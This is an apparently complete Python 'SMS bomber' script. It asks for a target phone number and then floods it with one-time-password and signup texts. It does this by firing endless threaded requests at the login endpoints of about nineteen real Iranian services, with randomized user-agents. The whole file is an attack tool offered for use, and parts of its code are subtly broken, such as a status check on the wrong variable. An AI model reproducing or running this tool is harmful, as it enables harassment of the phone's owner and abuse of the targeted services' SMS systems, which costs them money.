#in the name of God
#Coded By Sardar Cybery
#A D O R TM
#Library
import os
import sys
import time
from colorama import Fore as Coloresh
import requests
from threading import Thread
import random
#User Agent
User = ["Mozilla/5.0 (Linux; Android 7.1.0; A30 Build/MNB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 12.4; rv:101.0) Gecko/20100101 Firefox/101.0","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0","Mozilla/5.0 (X11; Linux i686; rv:101.0) Gecko/20100101 Firefox/101.0","Mozilla/5.0 (Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0","Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:101.0) Gecko/20100101 Firefox/101.0","Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0","Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0","Mozilla/5.0 (Linux; Android 5.1.0; A6 Build/MNB19M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4464.104 Safari/537.36"]
#All API 
#Api Snap
def Snap(Number):
    SnapH= {"user-agent":random.choice(User)}
    SnapC = {"cellphone":"+98"+Number}
    try:
        time.sleep(2)
        SnapS = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",headers=SnapH,json=SnapC)
        if Snap.ok == True:
            print(Coloresh.GREEN+"Send Sms :)")
        else:
            print(Coloresh.RED+"No Send :( ")
    except:
        print(Coloresh.RED+"No Send :( ")
#Api Tap30
def Tap30(Number): 
    TapH = {"user-agent":random.choice(User)}
    TapC = {"phoneNumber":"0"+Number}
    try:
        time.sleep(1)
        TapS = requests.post("https://api.tapsi.cab/api/v2.2/user",headers=TapH,json=TapC)
        if TapS.ok == True:
            print(Coloresh.GREEN+"Send Sms :)")
        else:
            print(Coloresh.RED+"No Send :( ")
    except:
        print(Coloresh.RED+"No Send :( ")
#Api Echarge
def Echarge(Number):
    EchargeH = {"user-agent":random.choice(User)}
    EchargeC = {"phoneNumber":"0"+Number}   
    try:
        time.sleep(1)
        EchargeS = requests.post("https://www.echarge.ir/m/login?length=19",headers=EchargeH,json=EchargeC)
        if EchargeS.ok == True:
            print(Coloresh.GREEN+"Send Sms :)")
        else:
            print(Coloresh.RED+"No Send :( ")
    except:
        print(Coloresh.RED+"No Send :( ")
#Api Divar
def Divar(Number):
    DivarH = {"user-agent":random.choice(User)}
    DivarC = {"phone":Number}
    try:
        time.sleep(1)
        DivarS = requests.post("https://api.divar.ir/v5/auth/authenticate",headers=DivarH,json=DivarC)
        if DivarS.ok == True:
            print(Coloresh.GREEN+"Send Sms :)")
        else:
            print(Coloresh.RED+"No Send :( ")
    except:
        print(Coloresh.RED+"No Send :( ")
#Api Shad
def Bama(Number):
    BamaH = {"user-agent":random.choice(User)}
    BamaC = {"phone":"0"+Number}
    try:
        time.sleep(1)
        BamaS = requests.post("https://account.bama.ir/Account/OtpLogin",headers=BamaH,json=BamaC)
        if BamaS.ok == True:
            print(Coloresh.GREEN+"Send Sms :)")
        else:
            print(Coloresh.RED+"No Send :( ")
    except:
        print(Coloresh.RED+"No Send :( ")
#Api AliBaBa
def AliBaBa(Number):
    AliBaBaH = {"user-agent":random.choice(User)}
    AliBaBaC = {"phoneNumber":Number}
    try:
        time.sleep(1)
        AliBaBaS = requests.post("https://ws.alibaba.ir/api/v3/account/mobile/otp",headers=AliBaBaH,json=AliBaBaC)
        if AliBaBaS.ok == True:
            print(Coloresh.GREEN+"Send Sms :)")
        else:
            print(Coloresh.RED+"No Send :( ")
    except:
        print(Coloresh.RED+"No Send :( ")
#Api Shehypor
def Sheypor(Number):
    SheyporH = {"user-agent":random.choice(User)}
    SheyporC = {"username":"0"+Number}
    try:
        time.sleep(1)
        SheyporS = requests.post("https://www.sheypoor.com/api/v10.0.0/auth/send",headers=SheyporH,json=SheyporC)
        if SheyporS.ok == True:
            print(Coloresh.GREEN+"Send Sms :)")
        else:
            print(Coloresh.RED+"No Send :( ")
    except:
        print(Coloresh.RED+"No Send :( ")
#Api Rayanet
def Rayan(Number):
    RayanH = {"user-agent":random.choice(User)}
    RayanC = {"mobileNo":"0"+Number}
    try:
        time.sleep(1)
        RayanS = requests.post("https://lottery.rayanertebat.ir/api/User/Otp?t=1654249279349",headers=RayanH,json=RayanC)
        if RayanS.ok == True:
            print(Coloresh.GREEN+"Send Sms :)")
        else:
            print(Coloresh.RED+"No Send :( ")
    except:
        print(Coloresh.RED+"No Send :( ")
#Api Digi Kala
def DigiKala(Number):
    DigiKalaH = {"user-agent":random.choice(User)}
    DigiKalaC = {"username":"0"+Number}
    try:
        time.sleep(1)
        DigiKalaS = requests.post("https://api.digikala.com/v1/user/authenticate/",headers=DigiKalaH,json=DigiKalaC)
        if DigiKalaS.ok == True:
            print(Coloresh.GREEN+"Send Sms :)")
        else:
            print(Coloresh.RED+"No Send :( ")
    except:
        print(Coloresh.RED+"No Send :( ")
#Api DiGiKalaJet
def DigiKalaJet(Number):
    DiGiKalaJetH = {"user-agent":random.choice(User)}
    DiGiKalaJetC = {"phone":"0"+Number}
    try:
        DiGiKalaJetS = requests.post("https://api.digikalajet.ir/user/login-register/",headers=DiGiKalaJetH,json=DiGiKalaJetC)
        if DiGiKalaJetS.ok == True:
            print(Coloresh.GREEN+"Send Sms :)")
        else:
            print(Coloresh.RED+"No Send :( ")
    except:
        print(Coloresh.RED+"No Send :( ")
#Api Delino
def Delino(Number):
    DelinoH = {"user-agent":random.choice(User)}
    DelinoC = {"mobile":"0"+Number}
    try:
        time.sleep(1)
        DelinoS = requests.post("https://www.delino.com/user/register",headers=DelinoH,json=DelinoC)
        if DelinoS.ok == True:
            print(Coloresh.GREEN+"Send Sms :)")
        else:
            print(Coloresh.RED+"No Send :( ")
    except:
        print(Coloresh.RED+"No Send :( ")
#Ali Messenger
def Messenger(Number):
    MessengerH = {"user-agent":random.choice(User)}
    MessengerC = {"phone_number":"98"+Number}
    try:
        time.sleep(1)
        MessengerS = requests.post("https://messengerg2c1.iranlms.ir/",headers=MessengerH,json=MessengerC)
        if MessengerS.ok == True:
            print(Coloresh.GREEN+"Send Sms :)")
        else:
            print(Coloresh.RED+"No Send :( ")
    except:
        print(Coloresh.RED+"No Send :( ")
#Api Paziresh24
def Paziresh24(Number):
    Paziresh24H = {"user-agent":random.choice(User)}
    Paziresh24C = {"cell":"0"+Number}
    try:
        time.sleep(1)
        Paziresh24S = requests.post("https://www.paziresh24.com/api/register",headers=Paziresh24H,json=Paziresh24C)
        if Paziresh24S.ok == True:
            print(Coloresh.GREEN+"Send Sms :)")
        else:
            print(Coloresh.RED+"No Send :( ")
    except:
        print(Coloresh.RED+"No Send :( ")
#Api Taghche
def Taghche(Number):
    TaghcheH = {"user-agent":random.choice(User)}
    TaghcheC = {"contact":"0"+Number}
    try:
        time.sleep(1)
        TaghcheS = requests.post("https://gw.taaghche.com/v4/site/auth/signup",headers=TaghcheH,json=TaghcheC)
        if TaghcheS.ok == True:
            print(Coloresh.GREEN+"Send Sms :)")
        else:
            print(Coloresh.RED+"No Send :( ")
    except:
        print(Coloresh.RED+"No Send :( ")
#Api Helsa
def Helsa(Number):
    HelsaH = {"user-agent":random.choice(User)}
    HelsaC = {"mobileNumber":"0"+Number}
    try:
        HelsaS = requests.post(f"https://api.helsa.co/api/User/GetRegisterCode?mobileNumber=0{Number}&deviceId=25010064645373610205005635373610201245305768136624&discountCode=&utm_content=&utm_source=&utm_campain=",headers=HelsaH,json=HelsaC)
        if HelsaS.ok == True:
            print(Coloresh.GREEN+"Send Sms :)")
        else:
            print(Coloresh.RED+"No Send :( ")
    except:
        print(Coloresh.RED+"No Send :( ")
#Api Gap
def Gap(Number):
    GapH = {"user-agent":random.choice(User)}
    GapC = {"mobile":"+98"+Number}
    try:
        time.sleep(2)
        GapS = requests.post("https://core.gap.im/v1/user/add.json?mobile=%2B989123456789",headers=GapH,json=GapC)
        if GapS.ok == True:
            print(Coloresh.GREEN+"Send Sms :)")
        else:
            print(Coloresh.RED+"No Send :( ")
    except:
        print(Coloresh.RED+"No Send :( ")
#Api Agahio
def Agahio(Number):
    AgahioH = {"user-agent":random.choice(User)}
    AgahioC = {"number":"0"+Number}
    try:
        time.sleep(1)
        AgahioS = requests.post("https://agahio.ir/wp-admin/admin-ajax.php",headers=AgahioH,json=AgahioC)
        if AgahioS.ok == True:
            print(Coloresh.GREEN+"Send Sms :)")
        else:
            print(Coloresh.RED+"No Send :( ")
    except:
        print(Coloresh.RED+"No Send :( ")
#Api Pezeshket
def Pezeshket(Number):
    PezeshketH = {"user-agent":random.choice(User)}
    PezeshketC = {"mobileNumber":Number}
    try:
        PezeshketS = requests.post("https://api.pezeshket.com/core/v1/auth/requestCode",headers=PezeshketH,json=PezeshketC)
        if PezeshketS.ok == True:
            print(Coloresh.GREEN+"Send Sms :)")
        else:
            print(Coloresh.RED+"No Send :( ")
    except:
        print(Coloresh.RED+"No Send :( ")
#Api Torob
def Torob(Number):
    TorobH = {"user-agent":random.choice(User)}
    TorobC = {"phone_number":"0"+Number}
    try:
        time.sleep(1)
        TorobS = requests.post("https://api.torob.com/v4/user/phone/send-pin/?phone_number=09123456789",headers=TorobH,json=TorobC)
        if TorobS.ok == True:
            print(Coloresh.GREEN+"Send Sms :)")
        else:
            print(Coloresh.RED+"No Send :( ")
    except:
        print(Coloresh.RED+"No Send :( ")
#Api Bazar
def Bazar(Number):
    BazarH = {"user-agent":random.choice(User)}
    BazarC = {"username":"98"+Number}
    try:
        time.sleep(1)
        BazarS = requests.post("https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest",headers=BazarH,json=BazarC)
        if BazarS.ok == True:
            print(Coloresh.GREEN+"Send Sms :)")
        else:
            print(Coloresh.RED+"No Send :( ")
    except:
        print(Coloresh.RED+"No Send :( ")
#Panel
def Panel():
    os.system("clear")
    time.sleep(1)
    print(Coloresh.GREEN + '''
    
    ||||||||||||||||||||||||||||||||||||||\n    ||||||||||||||||||||||||||||||||||||||\n    ||||||||||||||||||||||||||||||||||||||''' + Coloresh.RED + '''
                      w''' + Coloresh.WHITE + '''
    ||||||||||||''' + Coloresh.RED + "  //  |  \\\ " + Coloresh.WHITE + " |||||||||||||\n    ||||||||||||" + Coloresh.RED + " ||   |   || " + Coloresh.WHITE + "|||||||||||||\n    ||||||||||||" + Coloresh.RED + "  \\\  |  //  " + Coloresh.WHITE + "|||||||||||||" + Coloresh.RED + '''
    
    ||||||||||||||||||||||||||||||||||||||\n    ||||||||||||||||||||||||||||||||||||||\n    ||||||||||||||||||||||||||||||||||||||
                
             ''' + Coloresh.CYAN + "Coded " + Coloresh.LIGHTMAGENTA_EX + "By " + Coloresh.YELLOW + '''Null :) ''' + Coloresh.BLUE + '''
    


             1) Start Bomber
             2) Exit
    ''')
    Panel_Text = str(input("(1 / 2) ===>> "))
    while True:
        if Panel_Text == "1":
            SmsBomber()
            break
        if Panel_Text == "2":
            os.system("clear")
            time.sleep(1)
            print(Coloresh.RED + "GodBye Bro :')")
            exit()
        else:
            Panel_Text = str(input(Coloresh.GREEN + "Error\n(1 / 2) ===>> "))
#Smsbomber
def SmsBomber():
    global Number
    os.system("clear")
    time.sleep(1)
    print(Coloresh.CYAN + '''
    
    
                    /\         |||||||         ||||||       |||||||
                   /  \        |      |       |      |      |      |
                  /    \       |       |     |        |     |||||||
                 /______\      |       |     |        |     ||    ||
                /        \     |      |       |      |      ||     ||
               /          \    |||||||         ||||||       ||      ||

                                         A D O R TM
                                     Coded By Sardar Cybery
    ''') 
    Number = str(input("Send Me Number Phone Target (Example : 9123456789) ===>> "))
    while True:
        if len(Number) == 10:
            while True:
                try:
                    Number = int(Number)
                    Number = str(Number)
                    break
                except:
                    os.system("clear")
                    time.sleep(1)
                    Number = str(input(Coloresh.RED + "Error\nSend Me Number Phone Target (Example : 9123456789) ===>> "))
            Attack()
            break
        else:
            os.system("clear")
            time.sleep(1)
            Number = str(input(Coloresh.RED + "Error\nSend Me Number Phone Target (Example : 9123456789) ===>> "))
#Attack
def Attack():   
    os.system("clear")
    time.sleep(1)
    while True:
        Thread(target=Snap, args=[Number]).start()
        Thread(target=Tap30, args=[Number]).start()
        Thread(target=Echarge, args=[Number]).start()
        Thread(target=Divar, args=[Number]).start()
        Thread(target=Delino, args=[Number]).start()
        Thread(target=DigiKala, args=[Number]).start()
        Thread(target=DigiKalaJet, args=[Number]).start()
        Thread(target=Messenger, args=[Number]).start()
        Thread(target=AliBaBa, args=[Number]).start()
        Thread(target=Rayan, args=[Number]).start()
        Thread(target=Sheypor, args=[Number]).start()
        Thread(target=Gap, args=[Number]).start()
        Thread(target=Bazar, args=[Number]).start()
        Thread(target=Agahio, args=[Number]).start()
        Thread(target=Paziresh24, args=[Number]).start()
        Thread(target=Pezeshket, args=[Number]).start()
        Thread(target=Helsa, args=[Number]).start()
        Thread(target=Torob, args=[Number]).start()
        Thread(target=Taghche, args=[Number]).start()
#Run
Panel()

#Coded By Sardar Cybery
#A D O R TM